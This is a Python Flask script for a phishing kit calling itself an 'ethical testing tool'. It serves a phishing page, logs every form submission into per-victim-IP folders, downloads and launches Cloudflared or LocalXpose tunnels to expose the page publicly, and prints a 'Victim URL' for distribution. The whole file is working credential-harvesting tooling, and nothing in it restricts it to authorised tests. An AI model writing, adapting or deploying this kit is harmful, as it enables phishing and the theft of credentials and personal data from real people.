import os
import platform
import subprocess
import time
from flask import Flask, request, render_template
import json
from datetime import datetime

# Flask app
app = Flask(__name__, template_folder="templates")

# Global variables
victim_data_folder = "victim_data"
server_folder = ".server"

# Ensure required directories exist
os.makedirs(victim_data_folder, exist_ok=True)
os.makedirs(server_folder, exist_ok=True)

# URLs for downloading dependencies
CLOUDFLARED_URLS = {
    "linux": "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64",
    "windows": "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe",
    "darwin": "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-amd64",
}
LOCALXPOSE_URL = "https://api.localxpose.io/downloads/localxpose-linux"

@app.route("/", methods=["GET", "POST"])
def phishing_page():
    victim_ip = request.remote_addr
    victim_folder = os.path.join(victim_data_folder, victim_ip)
    os.makedirs(victim_folder, exist_ok=True)

    if request.method == "POST":
        form_data = request.form.to_dict()
        form_data["timestamp"] = str(datetime.now())
        with open(os.path.join(victim_folder, "details.json"), "a") as file:
            json.dump(form_data, file, indent=4)
            file.write("\n")

        if "name" not in form_data:
            return render_template("name_prompt.html")
        else:
            return render_template("success.html")

    return render_template("phishing_template.html")


def download_dependency(url, output_path):
    print(f"[*] Downloading {output_path}...")
    try:
        subprocess.run(["curl", "-L", "-o", output_path, url], check=True)
        os.chmod(output_path, 0o755)  # Ensure the file is executable
        print(f"[+] {output_path} downloaded successfully.")
    except subprocess.CalledProcessError as e:
        print(f"[!] Failed to download {output_path}: {e}")
        exit(1)


def ensure_cloudflared():
    cloudflared_path = os.path.join(server_folder, "cloudflared")
    if platform.system().lower() == "windows":
        cloudflared_path += ".exe"

    if not os.path.exists(cloudflared_path):
        os_type = platform.system().lower()
        if os_type not in CLOUDFLARED_URLS:
            print("[!] Unsupported operating system for Cloudflared.")
            exit(1)
        download_dependency(CLOUDFLARED_URLS[os_type], cloudflared_path)
    return cloudflared_path


def ensure_localxpose():
    localxpose_path = os.path.join(server_folder, "localxpose")
    if not os.path.exists(localxpose_path):
        download_dependency(LOCALXPOSE_URL, localxpose_path)
    return localxpose_path


def generate_localhost_url(port):
    return f"http://127.0.0.1:{port}"


def start_cloudflared(port):
    cloudflared_path = ensure_cloudflared()
    process = subprocess.Popen(
        [cloudflared_path, "tunnel", "--url", f"http://127.0.0.1:{port}"],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
    )

    time.sleep(10)  # Wait for Cloudflared to establish the tunnel
    output = process.stdout.read()
    url = None
    for line in output.splitlines():
        if "trycloudflare.com" in line:
            url = line.split(" ")[-1].strip()
            break

    if url:
        return url
    else:
        process.terminate()
        raise Exception("Cloudflared failed to generate a URL")


def start_localxpose(port):
    localxpose_path = ensure_localxpose()
    process = subprocess.Popen(
        [localxpose_path, "http", f"--port={port}"],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
    )

    time.sleep(10)  # Wait for LocalXpose to establish the tunnel
    output = process.stdout.read()
    url = None
    for line in output.splitlines():
        if "loclx.io" in line:
            url = line.split(" ")[-1].strip()
            break

    if url:
        return url
    else:
        process.terminate()
        raise Exception("LocalXpose failed to generate a URL")


def display_banner():
    print("\033[1;92m")
    print("██╗  ██╗ █████╗ ████████╗██████╗  ██████╗ ██╗   ██╗")
    print("██║  ██║██╔══██╗╚══██╔══╝██╔══██╗██╔═══██╗██║   ██║")
    print("███████║███████║   ██║   ██████╔╝██║   ██║██║   ██║")
    print("██╔══██║██╔══██║   ██║   ██   ██╗██║   ██║██║   ██║")
    print("██║  ██║██║  ██║   ██║   ██████╔╝╚██████╔╝╚██████╔╝")
    print("╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═════╝  ╚═════╝  ╚═██║═╝ ")
    print("\033[1;94m")
    print("                H A T B OY")
    print("         Ethical Testing Tool v3.2")
    print("\033[1;93m")
    print("       Developed by Mister-God")
    print("\033[0m")


if __name__ == "__main__":
    display_banner()
    print("Select an option:")
    print("[01] Localhost")
    print("[02] Cloudflared")
    print("[03] LocalXpose")

    choice = input("Enter your choice: ").strip()  # Strip whitespace from input

    port = 8080
    if choice == "01" or choice == "1":
        url = generate_localhost_url(port)
    elif choice == "02" or choice == "2":
        url = start_cloudflared(port)
    elif choice == "03" or choice == "3":
        url = start_localxpose(port)
    else:
        print("[!] Invalid choice")
        exit(1)

    print(f"[+] Victim URL: {url}")
    app.run(host="0.0.0.0", port=port)
